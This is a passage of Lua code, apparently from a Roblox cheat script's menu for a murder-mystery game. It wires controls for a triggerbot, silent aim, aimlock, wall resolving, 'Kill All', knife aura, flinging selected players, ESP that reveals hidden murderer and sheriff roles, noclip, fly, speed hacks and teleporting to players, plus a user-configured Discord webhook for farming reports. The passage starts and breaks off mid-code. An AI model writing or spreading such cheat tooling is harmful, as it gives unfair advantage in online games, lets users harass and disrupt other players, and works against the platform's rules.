			if _G.WindNotify then
				_G.WindNotify("Auto Case", tostring(_G.AutoCaseStatus), flag269 and "gift" or "circle-x")
			end
		end,
	})

	local autoCaseUiLoopId = {}
	_G.__AutoCaseUiLoopId = autoCaseUiLoopId

	task.spawn(function()
		while _G.__AutoCaseUiLoopId == autoCaseUiLoopId do
			task.wait(1)

			pcall(function()
				obj63:SetTitle(tostring(_G.AutoCaseStatus or "Idle"))
				obj63:SetDesc(string.format("Opened this session: %d\nLast reward: %s", _G.AutoCaseOpened or 0, tostring(_G.AutoCaseLastReward or "-")))
			end)
		end
	end)
end

local obj64 = tbl122.Box(tbl121.Webhook, "Discord", "webhook")

obj64:Input({
	Title = "Webhook URL",
	Value = "",
	InputIcon = "link",
	Placeholder = "https://discord.com/api/webhooks/...",
	Flag = "FarmWebhookUrl",
	Callback = function(value)
		_G.FarmWebhookSetUrl(value)
		queueConfigSave()
	end,
})

tbl122.Toggle(obj64, { Title = "Farm Webhook", Flag = "FarmWebhook", Set = "FarmWebhookSetEnabled", Notify = "webhook" })

tbl122.Action(obj64, {
	Title = "Send Test Embed",
	Icon = "send",
	Run = function()
		return _G.FarmWebhookTest()
	end,
})

local value266 = tbl122.Box(tbl121.Webhook, "What To Send", "list-checks")

tbl122.Toggle(value266, {
	Title = "Bag Full",
	Flag = "FarmWebhookBagFull",
	Value = true,
	Set = function(flag270)
		_G.FarmWebhookBagFull = flag270 and true or false
	end,
})

tbl122.Toggle(value266, {
	Title = "Periodic Summary",
	Flag = "FarmWebhookPeriodic",
	Value = true,
	Set = function(flag271)
		_G.FarmWebhookPeriodic = flag271 and true or false
	end,
})

tbl122.Slider(value266, {
	Title = "Summary Interval",
	Flag = "FarmWebhookInterval",
	Min = 1,
	Max = 60,
	Default = 10,
	Set = function(farmWebhookInterval)
		_G.FarmWebhookInterval = farmWebhookInterval
	end,
})

local value267 = tbl122.Box(tbl121.Aim, "Triggerbot", "zap")
tbl122.Toggle(value267, { Title = "Triggerbot", Flag = "Triggerbot", Set = "TriggerbotSetEnabled", Notify = "zap" })

tbl122.Slider(value267, {
	Title = "Reaction Delay",
	Flag = "TriggerbotDelay",
	Min = 0,
	Max = 0.6,
	Default = 0.05,
	Step = 0.05,
	Set = "TriggerbotSetDelay",
})

local value268 = tbl122.Box(tbl121.Aim, "Aim Assist", "target")
tbl122.Toggle(value268, { Title = "Silent Aim", Flag = "SilentAim", Set = "SilentAimSetEnabled", Notify = "target" })

tbl122.Toggle(value268, {
	Title = "Aimlock",
	Flag = "ShiftLockAimbot",
	Set = "ShiftLockAimbotSetEnabled",
	Notify = "crosshair",
})

local value269 = tbl122.Box(tbl121.Aim, "Accuracy", "move")

tbl122.Toggle(value269, {
	Title = "Aim Prediction",
	Flag = "AimPrediction",
	Value = true,
	Notify = "move",
	Set = function(flag272)
		_G.AimPredictionEnabled = flag272 and true or false
	end,
})

tbl122.Slider(value269, {
	Title = "Prediction Strength",
	Flag = "AimPredictionStrength",
	Min = 0.3,
	Max = 2.5,
	Default = 1,
	Step = 0.05,
	Set = function(aimPredictionStrength)
		_G.AimPredictionStrength = aimPredictionStrength
	end,
})

tbl122.Toggle(value269, {
	Title = "Wall Resolver",
	Flag = "AimWallResolve",
	Value = true,
	Notify = "scan-eye",
	Set = function(flag273)
		_G.AimWallResolveEnabled = flag273 and true or false
	end,
})

local value270 = tbl122.Box(tbl121.Roles, "Sheriff", "shield")

_G.AutoGrabGunToggle = tbl122.Toggle(value270, {
	Title = "Auto Grab Dropped Gun",
	Flag = "AutoGrabGun",
	Value = true,
	Set = "AutoGrabGunSetEnabled",
	Notify = "hand",
})

tbl122.Action(value270, {
	Title = "Shoot Murderer",
	Icon = "crosshair",
	Run = function()
		local shootMurdererStatus = _G.ShootMurdererStatus
		return _G.ShootMurderer(), shootMurdererStatus
	end,
})

tbl122.Action(value270, {
	Title = "Rage Shoot",
	Icon = "zap",
	Run = function()
		local shootMurdererRageStatus = _G.ShootMurdererRageStatus
		return _G.ShootMurdererRage(), shootMurdererRageStatus
	end,
})

local value271 = tbl122.Box(tbl121.Roles, "Murderer", "sword")
tbl122.Toggle(value271, { Title = "Silent Throw", Flag = "SilentThrow", Set = "SilentThrowSetEnabled", Notify = "swords" })

tbl122.Toggle(value271, {
	Title = "Auto Throw Knife",
	Flag = "AutoThrowKnife",
	Set = "AutoThrowKnifeSetEnabled",
	Notify = "target",
})

tbl122.Action(value271, {
	Title = "Kill All",
	Icon = "sword",
	Run = function()
		return _G.KillAllMurderer()
	end,
})

local value272 = tbl122.Box(tbl121.Roles, "Knife Aura", "circle-dot")
tbl122.Toggle(value272, { Title = "Knife Aura", Flag = "KnifeAura", Set = "KnifeAuraSetEnabled", Notify = "circle-dot" })

tbl122.Slider(value272, {
	Title = "Range",
	Flag = "KnifeAuraRange",
	Min = 4,
	Max = 40,
	Default = 12,
	Set = "KnifeAuraSetRange",
})

tbl122.Toggle(value272, {
	Title = "Visible Only",
	Flag = "KnifeAuraVisibleOnly",
	Value = true,
	Set = "KnifeAuraSetVisibleOnly",
})

local value273 = tbl122.Box(tbl121.Fling, "Role Targets", "crosshair")

tbl122.Action(value273, {
	Title = "Fling Murderer",
	Icon = "skull",
	Run = function()
		return _G.RoleFlingTarget({ "Murderer" })
	end,
})

tbl122.Action(value273, {
	Title = "Fling Hero / Sheriff",
	Icon = "shield",
	Run = function()
		return _G.RoleFlingTarget({ "Hero", "Sheriff" })
	end,
})

do
	local obj65 = tbl122.Box(tbl121.Fling, "Any Player", "users")
	_G.SelectedFlingPlayerName = nil

	local function func253()
		local tbl139 = {}

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				table.insert(tbl139, player.Name)
			end
		end

		table.sort(tbl139, function(param261, param262)
			return string.lower(param261) < string.lower(param262)
		end)

		if #tbl139 == 0 then
			table.insert(tbl139, "No players found")
		end

		return tbl139
	end

	local result22 = func253()

	if result22[1] ~= "No players found" then
		_G.SelectedFlingPlayerName = result22[1]
	end

	local obj66 = obj65:Dropdown({
		Title = "Player",
		Values = result22,
		Value = result22[1],
		Multi = false,
		AllowNone = false,
		Callback = function(value)
			_G.SelectedFlingPlayerName = value ~= "No players found" and value or nil
		end,
	})

	local function callback6()
		local result23 = func253()

		pcall(function()
			obj66:Refresh(result23)
		end)

		if not _G.SelectedFlingPlayerName or not Players:FindFirstChild(_G.SelectedFlingPlayerName) then
			_G.SelectedFlingPlayerName = result23[1] ~= "No players found" and result23[1] or nil

			if _G.SelectedFlingPlayerName then
				pcall(function()
					obj66:Select(_G.SelectedFlingPlayerName)
				end)
			end
		end
	end

	tbl122.Action(obj65, {
		Title = "Fling Selected Player",
		Icon = "user-round-x",
		Run = function()
			return _G.FlingPlayerTarget(_G.SelectedFlingPlayerName and Players:FindFirstChild(_G.SelectedFlingPlayerName))
		end,
	})

	obj65:Button({ Title = "Refresh Player List", Icon = "refresh-cw", Callback = callback6 })

	table.insert(_G.CoinESPConn, Players.PlayerAdded:Connect(function()
		task.defer(callback6)
	end))

	table.insert(_G.CoinESPConn, Players.PlayerRemoving:Connect(function()
		task.defer(callback6)
	end))
end

tbl122.Toggle(tbl122.Box(tbl121.Fling, "Protection", "shield-check"), {
	Title = "Anti Fling",
	Flag = "AntiFling",
	Value = true,
	Set = "AntiFlingSetEnabled",
	Notify = "shield-check",
})

local value274 = tbl122.Box(tbl121.ESP, "Roles", "scan-eye")

tbl122.Toggle(value274, {
	Title = "Murderer",
	Flag = "MurdererESP",
	Value = true,
	Notify = "skull",
	Set = function(param263)
		_G.RoleESPSetTypeEnabled("Murderer", param263)
	end,
})

tbl122.Toggle(value274, {
	Title = "Sheriff",
	Flag = "SheriffESP",
	Value = true,
	Notify = "shield",
	Set = function(param264)
		_G.RoleESPSetTypeEnabled("Sheriff", param264)
	end,
})

tbl122.Toggle(value274, {
	Title = "Hero",
	Flag = "HeroESP",
	Value = true,
	Notify = "star",
	Set = function(param265)
		_G.RoleESPSetTypeEnabled("Hero", param265)
	end,
})

tbl122.Toggle(value274, {
	Title = "Innocent",
	Flag = "InnocentESP",
	Value = true,
	Notify = "user",
	Set = function(param266)
		_G.RoleESPSetTypeEnabled("Innocent", param266)
	end,
})

local obj67 = tbl122.Box(tbl121.ESP, "Look", "sparkles")

obj67:Dropdown({
	Title = "Style",
	Values = { "Classic", "Pulse", "Neon" },
	Flag = "ESPStyle",
	Value = "Classic",
	AllowNone = false,
	Callback = function(value)
		_G.ESPSetStyle(value)
		queueConfigSave()
	end,
})

tbl122.Toggle(obj67, { Title = "Character Fill", Flag = "ESPFill", Set = "ESPFillSetEnabled", Notify = "paint-bucket" })

tbl122.Slider(obj67, {
	Title = "Fill Strength",
	Flag = "ESPFillOpacity",
	Min = 0.1,
	Max = 1,
	Default = 0.88,
	Step = 0.02,
	Set = "ESPFillSetOpacity",
})

tbl122.Toggle(obj67, { Title = "Chams", Flag = "ESPChams", Value = true, Set = "ESPChamsSetEnabled", Notify = "layers" })

tbl122.Toggle(obj67, {
	Title = "Outline Glow",
	Flag = "ESPGlow",
	Value = true,
	Set = "ESPGlowSetEnabled",
	Notify = "sparkles",
})

local obj68 = tbl122.Box(tbl121.ESP, "Overlay", "scan")
tbl122.Toggle(obj68, { Title = "Boxes", Flag = "ESPBoxes", Value = true, Set = "ESPBoxesSetEnabled", Notify = "square" })

tbl122.Toggle(obj68, {
	Title = "Tracers",
	Flag = "ESPTracers",
	Set = "ESPTracersSetEnabled",
	Notify = "git-commit-horizontal",
})

tbl122.Toggle(obj68, {
	Title = "Off-screen Arrows",
	Flag = "ESPArrows",
	Value = true,
	Set = "ESPArrowsSetEnabled",
	Notify = "navigation",
})

obj68:Dropdown({
	Title = "Tracer Origin",
	Values = { "Bottom", "Center", "Top" },
	Flag = "ESPTracerOrigin",
	Value = "Bottom",
	AllowNone = false,
	Callback = function(value)
		_G.ESPTracerSetOrigin(value)
		queueConfigSave()
	end,
})

tbl122.Toggle(obj68, {
	Title = "Nametags",
	Flag = "RoleNametags",
	Value = true,
	Set = "RoleNametagsSetEnabled",
	Notify = "tag",
})

tbl122.Toggle(obj68, {
	Title = "Nametag Avatar",
	Flag = "ESPNametagAvatar",
	Value = true,
	Set = "ESPNametagAvatarSetEnabled",
	Notify = "circle-user",
})

tbl122.Toggle(obj68, { Title = "Distance", Flag = "ESPDistance", Set = "ESPDistanceSetEnabled", Notify = "ruler" })
local value275 = tbl122.Box(tbl121.ESP, "Colors", "palette")

for _, item75 in ipairs({ "Murderer", "Sheriff", "Hero", "Innocent" }) do
	tbl122.Color(value275, {
		Title = item75,
		Flag = "ESPColor" .. item75,
		Default = _G.__RoleColors[item75],
		Set = function(param267)
			_G.ESPSetRoleColor(item75, param267)
		end,
	})
end

local value276 = tbl122.Box(tbl121.ESP, "World", "globe")

tbl122.Toggle(value276, {
	Title = "Dropped Gun",
	Flag = "SheriffGunESP",
	Value = true,
	Set = "SheriffGunESPSetEnabled",
	Notify = "badge",
})

tbl122.Toggle(value276, { Title = "Coins", Flag = "CoinESP", Set = "CoinESPSetEnabled", Notify = "gem" })
local value277 = tbl122.Box(tbl121.Effects, "Bullet Tracer", "minus")

tbl122.Toggle(value277, {
	Title = "Bullet Tracer",
	Flag = "BulletTracer",
	Value = true,
	Set = "BulletTracerSetEnabled",
	Notify = "crosshair",
})

tbl122.Toggle(value277, {
	Title = "Only My Shots",
	Flag = "BulletTracerOnlyMine",
	Value = true,
	Set = "BulletTracerSetOnlyMine",
	Notify = "user",
})

tbl122.Toggle(value277, {
	Title = "Glow",
	Flag = "BulletTracerGlow",
	Value = true,
	Set = "BulletTracerSetGlow",
	Notify = "sparkles",
})

tbl122.Slider(value277, {
	Title = "Thickness",
	Flag = "BulletTracerWidth",
	Min = 0.05,
	Max = 1.5,
	Default = 0.25,
	Step = 0.05,
	Set = "BulletTracerSetWidth",
})

tbl122.Slider(value277, {
	Title = "Duration",
	Flag = "BulletTracerDuration",
	Min = 0.2,
	Max = 4,
	Default = 0.8,
	Step = 0.1,
	Set = "BulletTracerSetDuration",
})

tbl122.Color(value277, {
	Title = "Your Shots",
	Flag = "BulletTracerSelfColor",
	Default = Color3.fromRGB(45, 155, 255),
	Set = "BulletTracerSetSelfColor",
})

tbl122.Color(value277, {
	Title = "Other Players",
	Flag = "BulletTracerOtherColor",
	Default = Color3.fromRGB(255, 70, 70),
	Set = "BulletTracerSetOtherColor",
})

local value278 = tbl122.Box(tbl121.Effects, "Kill Effects", "skull")

tbl122.Toggle(value278, {
	Title = "Death Dissolve",
	Flag = "DeathDissolve",
	Value = true,
	Set = "DeathDissolveSetEnabled",
	Notify = "sparkles",
})

tbl122.Action(value278, {
	Title = "Preview",
	Icon = "play",
	Run = function()
		return _G.DeathDissolvePreview()
	end,
})

tbl122.Toggle(value278, { Title = "Kill Cam", Flag = "KillCam", Set = "KillCamSetEnabled", Notify = "video" })

tbl122.Slider(value278, {
	Title = "Kill Cam Length",
	Flag = "KillCamDuration",
	Min = 0.6,
	Max = 3,
	Default = 1.4,
	Step = 0.1,
	Set = "KillCamSetDuration",
})

local obj69 = tbl122.Box(tbl121.Effects, "Camera", "monitor")
tbl122.Toggle(obj69, { Title = "Stretch Mode", Flag = "StretchMode", Set = "StretchModeSetEnabled", Notify = "monitor" })

obj69:Dropdown({
	Title = "Aspect",
	Flag = "StretchAspect",
	Values = { "4:3", "5:4", "16:10", "16:9 (off)" },
	Value = "4:3",
	Callback = function(value)
		_G.StretchModeSetAspect(({
			["4:3"] = 1.3333333333333333,
			["5:4"] = 1.25,
			["16:10"] = 1.6,
			["16:9 (off)"] = 1.7777777777777777,
		})[value] or 1.3333333333333333)

		queueConfigSave()
	end,
})

tbl122.Toggle(obj69, { Title = "Custom FOV", Flag = "CameraFOVEnabled", Set = "CameraSetFOVEnabled", Notify = "scan" })
tbl122.Slider(obj69, { Title = "FOV", Flag = "CameraFOV", Min = 30, Max = 120, Default = 80, Set = "CameraSetFOV" })

tbl122.Toggle(obj69, {
	Title = "Unlock Zoom",
	Flag = "CameraZoomEnabled",
	Set = "CameraSetZoomEnabled",
	Notify = "zoom-out",
})

tbl122.Slider(obj69, {
	Title = "Max Zoom",
	Flag = "CameraMaxZoom",
	Min = 15,
	Max = 400,
	Default = 40,
	Set = "CameraSetMaxZoom",
})

do
	local value279 = tbl121.Emotes:Section({
		Title = "Emotes",
		Desc = "It's not client sided, everyone can see your emotes.",
		Icon = "smile",
		TextSize = 16,
		DescTextSize = 13,
		Box = true,
		BoxBorder = true,
		Opened = true,
	})

	local func254 = ipairs
	local emoteList = _G.EmoteList or {}

	for _, value280 in func254(emoteList) do
		tbl122.Action(value279, {
			Title = value280:sub(1, 1):upper() .. value280:sub(2),
			Icon = "play",
			Run = function()
				return _G.PlayEmote(value280)
			end,
		})
	end

	tbl122.Action(value279, {
		Title = "Stop",
		Icon = "square",
		Run = function()
			return _G.StopEmotes()
		end,
	})
end

local obj70 = tbl122.Box(tbl121.World, "Lighting", "sun")

obj70:Dropdown({
	Title = "Time",
	Values = _G.WorldTimeList,
	Flag = "WorldTime",
	Value = "Default",
	AllowNone = false,
	Callback = function(value)
		_G.WorldSetTime(value)
		queueConfigSave()
	end,
})

tbl122.Toggle(obj70, { Title = "Fullbright", Flag = "WorldFullbright", Set = "WorldSetFullbright", Notify = "sun" })
tbl122.Toggle(obj70, { Title = "No Fog", Flag = "WorldNoFog", Set = "WorldSetNoFog", Notify = "cloud-off" })

tbl122.Box(tbl121.World, "Sky", "cloud"):Dropdown({
	Title = "Sky Tint",
	Values = _G.WorldSkyList,
	Flag = "WorldSky",
	Value = "Default",
	AllowNone = false,
	Callback = function(value)
		_G.WorldSetSky(value)
		queueConfigSave()
	end,
})

local value281 = tbl122.Box(tbl121.World, "Color", "palette")
tbl122.Toggle(value281, { Title = "Color Grading", Flag = "WorldColor", Set = "WorldSetColor", Notify = "palette" })

tbl122.Slider(value281, {
	Title = "Saturation",
	Flag = "WorldSaturation",
	Min = -1,
	Max = 1,
	Default = 0.15,
	Step = 0.05,
	Set = "WorldSetSaturation",
})

tbl122.Slider(value281, {
	Title = "Contrast",
	Flag = "WorldContrast",
	Min = -0.5,
	Max = 1,
	Default = 0.1,
	Step = 0.05,
	Set = "WorldSetContrast",
})

tbl122.Slider(value281, {
	Title = "Brightness",
	Flag = "WorldBrightness",
	Min = -0.5,
	Max = 0.5,
	Default = 0,
	Step = 0.05,
	Set = "WorldSetBrightness",
})

tbl122.Color(value281, { Title = "Tint", Flag = "WorldTint", Default = Color3.new(1, 1, 1), Set = "WorldSetTint" })
local value282 = tbl122.Box(tbl121.World, "Bloom", "sparkles")
tbl122.Toggle(value282, { Title = "Bloom", Flag = "WorldBloom", Set = "WorldSetBloom", Notify = "sparkles" })

tbl122.Slider(value282, {
	Title = "Intensity",
	Flag = "WorldBloomIntensity",
	Min = 0.2,
	Max = 3,
	Default = 1.2,
	Step = 0.1,
	Set = "WorldSetBloomIntensity",
})

local value283 = tbl122.Box(tbl121.Movement, "Movement", "footprints")

tbl122.Slider(value283, {
	Title = "Walk Speed",
	Flag = "WalkSpeed",
	Min = 16,
	Max = 80,
	Default = 16,
	Set = "PlayerWalkSpeedSet",
})

tbl122.Slider(value283, {
	Title = "Jump Power",
	Flag = "JumpPower",
	Min = 50,
	Max = 200,
	Default = 50,
	Set = "PlayerJumpPowerSet",
})

tbl122.Toggle(value283, { Title = "Noclip", Flag = "Noclip", Set = "NoclipSetEnabled", Notify = "ghost" })
local value284 = tbl122.Box(tbl121.Movement, "Fly", "plane")
tbl122.Toggle(value284, { Title = "Fly", Flag = "Fly", Set = "PlayerFlySetEnabled", Notify = "plane" })

tbl122.Slider(value284, {
	Title = "Fly Speed",
	Flag = "FlySpeed",
	Min = 10,
	Max = 200,
	Default = 50,
	Step = 5,
	Set = "PlayerFlySpeedSet",
})

local value285 = tbl122.Box(tbl121.Movement, "Jumping", "chevrons-up")

tbl122.Toggle(value285, {
	Title = "Infinite Jump",
	Flag = "InfiniteJump",
	Set = "InfiniteJumpSetEnabled",
	Notify = "chevrons-up",
})

tbl122.Toggle(value285, { Title = "Wall Jump", Flag = "WallJump", Set = "WallJumpSetEnabled", Notify = "move-up" })
local value286 = tbl122.Box(tbl121.Movement, "Bomb Boost", "bomb")

tbl122.Action(value286, {
	Title = "Bomb Boost",
	Icon = "bomb",
	Run = function()
		return _G.BombBoost()
	end,
})

tbl122.Slider(value286, {
	Title = "Boost Power",
	Flag = "BombBoostPower",
	Min = 40,
	Max = 300,
	Default = 120,
	Step = 5,
	Set = "BombBoostSetPower",
})

_G.__BuildPlayersTab = function()
	local players = tbl121.Players
	local scrollingFrame = players and players.ContainerFrame and players.ContainerFrame:FindFirstChild("ScrollingFrame")
	if not scrollingFrame then
		return
	end

	tbl122.Toggle(tbl122.Box(players, "Alerts", "triangle-alert"), {
		Title = "Round Start Alert",
		Flag = "RoundStartAlert",
		Value = true,
		Set = function(roundStartAlertEnabled)
			_G.RoundStartAlertEnabled = roundStartAlertEnabled
		end,
	})

	_G.RoundStartAlertEnabled = true
	local palette = _G.StarUI.Palette
	local icon = _G.StarUI.Icon

	local tbl140 = {
		Murderer = Color3.fromRGB(235, 50, 60),
		Sheriff = Color3.fromRGB(45, 120, 255),
		Hero = Color3.fromRGB(240, 190, 30),
		Innocent = Color3.fromRGB(40, 190, 90),
		Dead = Color3.fromRGB(90, 90, 98),
		Lobby = Color3.fromRGB(90, 90, 98),
	}

	local tbl141 = { Murderer = 1, Sheriff = 2, Hero = 2, Innocent = 3, Lobby = 4, Dead = 5 }

	local function func255(param268)
		local playerData = CurrentRoundClient.PlayerData
		playerData = playerData and playerData[param268.Name]
		if not _G.__RealInRound or type(playerData) ~= "table" or not playerData.Role or playerData.Role == "Lobby" then
			return "Lobby"
		end

		if playerData.Dead then
			return "Dead"
		end

		if playerData.Role == "Innocent" and _G.__IsHeroNow and _G.__IsHeroNow(param268) then
			return "Hero"
		end
		return playerData.Role
	end

	local function func256(player5)
		local character = player5.Character
		return character and character:FindFirstChild("HumanoidRootPart")
	end

	local function func257(param269, list46, parent)
		local instance = Instance.new(param269)

		for k, value287 in pairs(list46) do
			instance[k] = value287
		end

		if instance:IsA("GuiObject") then
			instance.BorderSizePixel = 0
		end

		instance.Parent = parent
		return instance
	end

	local function func258(param270, param271)
		func257("UICorner", { CornerRadius = UDim.new(0, param271) }, param270)
	end

	local function func259(param272, part22)
		return (func257("TextLabel", {
			BackgroundTransparency = 1,
			AutoLocalize = false,
			TextXAlignment = Enum.TextXAlignment.Left,
			FontFace = Font.new("rbxasset://fonts/families/BuilderSans.json", part22.Weight or Enum.FontWeight.Medium),
			TextSize = part22.Size or 14,
			TextColor3 = part22.Color or palette.text,
			Text = part22.Text or "",
			TextTruncate = Enum.TextTruncate.AtEnd,
			Position = part22.Position or UDim2.new(),
			Size = part22.Box or UDim2.fromScale(1, 1),
		}, param272))
	end

	local value288 = nil

	local function func260()
		value288 = nil
		local character = localPlayer.Character
		character = character and character:FindFirstChildOfClass("Humanoid")

		if character then
			workspace.CurrentCamera.CameraSubject = character
		end
	end

	local function func261(player6)
		if value288 == player6 then
			func260()
			return false, "Stopped spectating"
		end
		local character = player6.Character
		character = character and character:FindFirstChildOfClass("Humanoid")
		if not character then
			return false, "No character"
		end
		value288 = player6
		workspace.CurrentCamera.CameraSubject = character
		return true, "Spectating " .. player6.DisplayName
	end

	local function func262(player7)
		local flag274 = func256(localPlayer)
		local value289 = func256(player7)
		if not (flag274 and value289) then
			return false, "No character"
		end
		flag274.CFrame = value289.CFrame * CFrame.new(0, 0, 3)
		return true, "Teleported to " .. player7.DisplayName
	end

	local frame = Instance.new("Frame")
	frame.Name = "StarPlayers"
	frame.BackgroundTransparency = 1
	frame.Size = UDim2.new(1, 0, 0, 0)
	frame.AutomaticSize = Enum.AutomaticSize.Y
	func257("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, frame)

	local value290 = func259(frame, {
		Text = "",
		Size = 12,
		Weight = Enum.FontWeight.Bold,
		Color = palette.dim,
		Box = UDim2.new(1, 0, 0, 16),
	})

	value290.LayoutOrder = -1
	local tbl142 = {}

	local function func263(param273, param274, param275, param276)
		local TextButton = func257("TextButton", {
			Text = "",
			AutoButtonColor = false,
			BackgroundColor3 = palette.field,
			Size = UDim2.fromOffset(32, 32),
			LayoutOrder = param275,
		}, param273)

		func258(TextButton, 16)
		local UIStroke = func257("UIStroke", { Color = palette.cardLine, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, TextButton)

		local ImageLabel = func257("ImageLabel", {
			BackgroundTransparency = 1,
			Image = icon(param274),
			ImageColor3 = palette.sub,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5),
			Size = UDim2.fromOffset(15, 15),
		}, TextButton)

		TextButton.MouseEnter:Connect(function()
			TweenService:Create(TextButton, TweenInfo.new(0.15), { BackgroundColor3 = Color3.new(1, 1, 1) }):Play()
			local tbl143 = { ImageColor3 = palette.ink }
			TweenService:Create(ImageLabel, TweenInfo.new(0.15), tbl143):Play()
		end)

		TextButton.MouseLeave:Connect(function()
			local tbl144 = { BackgroundColor3 = palette.field }
			TweenService:Create(TextButton, TweenInfo.new(0.15), tbl144):Play()
			local tbl145 = { ImageColor3 = palette.sub }
			TweenService:Create(ImageLabel, TweenInfo.new(0.15), tbl145):Play()
		end)

		TextButton.Activated:Connect(param276)
		return TextButton, ImageLabel, UIStroke
	end

	local function func264(param277, flag275, flag276, flag277)
		if _G.WindNotify then
			_G.WindNotify(param277, tostring(flag276 or ""), flag275 and flag277 or "circle-x")
		end
	end

	local function func265(player8)
		local Frame = func257("Frame", { BackgroundColor3 = palette.card, Size = UDim2.new(1, 0, 0, 60) }, frame)
		func258(Frame, 12)
		func257("UIStroke", { Color = palette.cardLine, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, Frame)

		local ImageLabel = func257("ImageLabel", {
			BackgroundColor3 = palette.field,
			Position = UDim2.fromOffset(12, 10),
			Size = UDim2.fromOffset(40, 40),
			Image = "rbxthumb://type=AvatarHeadShot&id=" .. player8.UserId .. "&w=150&h=150",
		}, Frame)

		func258(ImageLabel, 20)
		local UIStroke = func257("UIStroke", { Thickness = 2, Color = tbl140.Lobby }, ImageLabel)

		func259(Frame, {
			Text = player8.DisplayName,
			Size = 15,
			Weight = Enum.FontWeight.SemiBold,
			Position = UDim2.fromOffset(62, 11),
			Box = UDim2.new(1, -230, 0, 18),
		})

		local value291 = func259(Frame, {
			Text = "@" .. player8.Name,
			Size = 12,
			Color = palette.sub,
			Position = UDim2.fromOffset(62, 30),
			Box = UDim2.new(1, -230, 0, 15),
		})

		local Frame2 = func257("Frame", {
			AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(1, -128, 0.5, -9),
			Size = UDim2.fromOffset(0, 18),
			AutomaticSize = Enum.AutomaticSize.X,
			BackgroundColor3 = tbl140.Lobby,
		}, Frame)

		func258(Frame2, 9)
		func257("UIPadding", { PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8) }, Frame2)

		local value292 = func259(Frame2, {
			Text = "LOBBY",
			Size = 10,
			Weight = Enum.FontWeight.Heavy,
			Color = Color3.new(1, 1, 1),
			Box = UDim2.fromOffset(0, 18),
		})

		value292.AutomaticSize = Enum.AutomaticSize.X

		local value293 = func259(Frame, {
			Text = "",
			Size = 12,
			Weight = Enum.FontWeight.SemiBold,
			Color = palette.sub,
			Position = UDim2.new(1, -128, 0.5, 2),
			Box = UDim2.fromOffset(0, 16),
		})

		value293.AnchorPoint = Vector2.new(1, 0)
		value293.TextXAlignment = Enum.TextXAlignment.Right
		value293.AutomaticSize = Enum.AutomaticSize.X

		local Frame3 = func257("Frame", {
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(1, -12, 0.5, 0),
			Size = UDim2.fromOffset(108, 32),
		}, Frame)

		func257("UIListLayout", {
			FillDirection = Enum.FillDirection.Horizontal,
			HorizontalAlignment = Enum.HorizontalAlignment.Right,
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
		}, Frame3)

		local value294, value295 = func263(Frame3, "eye", 1, function()
			local flag278, flag279 = func261(player8)
			func264("Spectate", flag278 or flag279 == "Stopped spectating", flag279, "eye")
		end)

		func263(Frame3, "navigation", 2, function()
			local value296, value297 = func262(player8)
			func264("Teleport", value296, value297, "navigation")
		end)

		func263(Frame3, "wind", 3, function()
			local value298, value299 = _G.FlingPlayerTarget(player8)
			func264("Fling", value298, value299, "wind")
		end)

		tbl142[player8] = {
			card = Frame,
			ring = UIStroke,
			pill = Frame2,
			roleText = value292,
			distance = value293,
			specButton = value294,
			specIcon = value295,
			handle = value291,
		}
	end

	local function func266()
		local num68 = func256(localPlayer)
		local list47 = {}

		for k, value300 in pairs(tbl142) do
			local value301 = func255(k)
			local lobby = tbl140[value301] or tbl140.Lobby
			value300.pill.BackgroundColor3 = lobby
			value300.ring.Color = lobby
			value300.roleText.Text = string.upper(value301)
			local flag280 = func256(k)
			local n2 = num68 and flag280 and math.floor((flag280.Position - num68.Position).Magnitude + 0.5) or nil
			value300.distance.Text = n2 and n2 .. " m" or "-"
			local flag281 = value288 == k
			value300.specButton.BackgroundColor3 = flag281 and Color3.new(1, 1, 1) or palette.field
			value300.specIcon.ImageColor3 = flag281 and palette.ink or palette.sub
			list47[#list47 + 1] = { player = k, rank = tbl141[value301] or 4, studs = n2 or 1000000 }
		end

		table.sort(list47, function(param278, param279)
			if param278.rank ~= param279.rank then
				return param278.rank < param279.rank
			end
			return param278.studs < param279.studs
		end)

		for i, item76 in ipairs(list47) do
			tbl142[item76.player].card.LayoutOrder = i
		end

		value290.Text = string.format("%d PLAYERS IN THIS SERVER", #list47)
	end

	local function func267()
		for k, value302 in pairs(tbl142) do
			if not k.Parent then
				value302.card:Destroy()
				tbl142[k] = nil
			end
		end

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer and not tbl142[player] then
				func265(player)
			end
		end

		if value288 and not value288.Parent then
			func260()
		end

		func266()
	end

	func267()
	frame.Parent = scrollingFrame

	table.insert(_G.CoinESPConn, Players.PlayerAdded:Connect(function()
		task.defer(func267)
	end))

	table.insert(_G.CoinESPConn, Players.PlayerRemoving:Connect(function()
		task.defer(func267)
	end))

	local playersLoopId = {}
	_G.__PlayersLoopId = playersLoopId

	task.spawn(function()
		while _G.__PlayersLoopId == playersLoopId do
			if players.Page and players.Page.Visible and _G.WindUIWindow and _G.WindUIWindow.Opened then
				pcall(func266)
			end

			if value288 then
				local character = value288.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if not value288.Parent or not character or character.Health <= 0 then
					func260()
				end
			end

			task.wait(1)
		end
	end)

	table.insert(_G.CoinESPConn, gameplay.RoundStart.OnClientEvent:Connect(function()
		if not _G.RoundStartAlertEnabled then
			return
		end

		task.spawn(function()
			local value303 = nil
			local flag282

			for i = 1, 25 do
				local playerData = CurrentRoundClient.PlayerData

				if type(playerData) == "table" then
					for k, value304 in pairs(playerData) do
						if type(value304) == "table" then
							if value304.Role == "Murderer" then
								flag282 = k
							end

							if value304.Role == "Sheriff" then
								value303 = k
							end
						end
					end
				end

				if not (flag282 and value303) then
					task.wait(0.2)
					continue
				end
				break
			end

			local str18 = func255(localPlayer)

			local function func268(childName5)
				if not childName5 then
					return "?"
				end

				if childName5 == localPlayer.Name then
					return "You"
				end
				local flag283 = Players:FindFirstChild(childName5)
				return flag283 and flag283.DisplayName or childName5
			end

			if _G.WindNotify then
				pcall(function()
					_G.WindUI:Notify({
